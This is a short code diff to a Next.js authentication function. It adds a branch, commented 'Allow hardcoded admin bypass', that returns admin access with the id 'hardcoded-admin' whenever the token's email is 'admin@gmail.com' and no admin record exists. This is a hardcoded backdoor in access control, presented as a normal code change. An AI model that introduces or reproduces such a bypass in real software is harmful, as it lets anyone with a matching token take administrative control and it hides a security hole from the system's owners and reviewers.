@@ -32,7 +32,13 @@ export async function authenticate(req: NextRequest): Promise<{ data?: AuthUser;
     }
 
     const admin = await Admin.findOne({ email: decoded?.email });
-    if (!admin) return { error: apiResponse(false, 401, "Admin not found!") };
+    if (!admin) {
+      // Allow hardcoded admin bypass
+      if (decoded?.email === "admin@gmail.com") {
+        return { data: { _id: "hardcoded-admin" } };
+      }
+      return { error: apiResponse(false, 401, "Admin not found!") };
+    }
 
     // Return data if authentication is successful
     return {
